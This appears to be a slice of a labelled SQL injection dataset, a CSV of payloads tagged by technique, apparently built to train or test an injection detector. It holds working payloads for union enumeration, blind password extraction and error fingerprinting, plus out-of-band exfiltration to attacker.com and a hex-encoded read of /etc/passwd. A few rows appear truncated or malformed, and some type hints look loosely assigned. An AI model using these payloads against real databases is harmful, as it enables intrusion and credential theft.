row_index,payload_norm,label,sqli_type_hint
41430,1; SELECT * FROM users--,1,stacked_select
41431,"' UNION SELECT LOAD_FILE(CONCAT('\\\\',user(),'.attacker.com\\a'))--",1,oob_dns
41432,'; EXEC master..xp_dirtree '//attacker.com/a'--,1,oob_mssql
41433,"' AND 1=2 UNION SELECT 1,load_file(0x2f6574632f706173737764)--",1,oob_file_read
41434,admin'--,1,second_order
41435,1' AND '1'='1,1,second_order
41436,'; SELECT ',1,second_order
41437,' UNION SELECT NULL--,1,union_column_enum
41438,"' UNION SELECT NULL,NULL--",1,union_column_enum
41439,"' UNION SELECT NULL,NULL,NULL--",1,union_column_enum
41440,"' UNION SELECT NULL,NULL,NULL,NULL--",1,union_column_enum
41441,"' UNION SELECT NULL,NULL,NULL,NULL,NULL--",1,union_column_enum
41442,"' UNION ALL SELECT NULL,NULL--",1,union_column_enum
41443,"1 UNION SELECT @@version,NULL--",1,union_column_enum
41444,"1 UNION SELECT user(),database()--",1,union_column_enum
41445,"1 UNION SELECT table_name,NULL FROM information_schema.tables LIMIT 1--",1,union_column_enum
41446,"1 UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--",1,union_column_enum
41447,' AND (SELECT 1 FROM users WHERE username='admin' AND LENGTH(password)>5)='1,1,blind_boolean_advanced
41448,"' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a",1,blind_boolean_advanced
41449,1 AND (SELECT COUNT(*) FROM users WHERE admin=1)>0,1,blind_boolean_advanced
41450,"' AND ORD(MID(password,1,1))>64 AND '1'='1",1,blind_boolean_advanced
41451,"' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM users GROUP BY x) t)='1",1,blind_boolean_advanced
41452,' '1'='1,1,filter_bypass
41453,"1 UN ION SEL ECT NULL,NULL--",1,filter_bypass
41454,"1 NULL,NULL--",1,filter_bypass
41455,"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",1,error_fingerprint
41456,"' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT version())))--",1,error_fingerprint
41457,"' AND 1=1 UNION SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x--",1,error_fingerprint
41458,"' PROCEDURE ANALYSE(EXTRACTVALUE(rand(),CONCAT(0x3a,version())),1)--",1,error_fingerprint
